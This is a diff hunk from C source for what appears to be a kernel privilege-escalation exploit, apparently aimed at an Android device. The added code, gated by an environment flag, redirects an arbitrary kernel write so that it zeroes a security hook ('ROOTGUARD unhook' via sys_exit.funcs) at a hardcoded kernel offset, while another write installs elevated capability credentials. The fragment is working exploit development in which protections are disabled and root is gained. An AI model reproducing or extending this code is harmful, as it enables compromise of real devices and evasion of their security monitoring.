@@ -1660,6 +1660,22 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
                 "right=0 left=%016zx\n",
                 write_pc, write_left);
       }
+      /*
+       * CAPSONLY override (roll 40 fix): the ARISTOTLE chain above sets
+       * W0.pi to write fake_fops to pselect_custom_target (child+0x780),
+       * OVERWRITING the main tree's correct caps-cred value. Override
+       * W0.pi to the PROVEN leaf-NULL ROOTGUARD unhook instead —
+       * *(sys_exit.funcs) = 0 — so BOTH writes are useful:
+       *   W0.pi: guard handler zeroed
+       *   main tree: caps cred installed
+       */
+      if (env_flag("MODE4_CAPSONLY", 0)) {
+        write_pc = (data_addr(KIMAGE_TEXT_BASE + 0x02950700ULL) - 8) | 1ULL;
+        write_right = 0;
+        write_left = 0;
+        pr_info("CAPSONLY+GUARD OVERRIDE: W0.pi leaf-NULL *(funcs)=0 "
+                "(pc=%016zx)\n", (size_t)write_pc);
+      }
     } else if (env_flag("MODE4_REF_LEFT", 0) || env_flag("MODE4_REF_LEFT_PI", 0) ||
         env_flag("MODE4_TOP_LEFT", 0)) {
       /* oppo-ghostlock-ref default: only-left on W0.pi (main stays 1,0,0) */
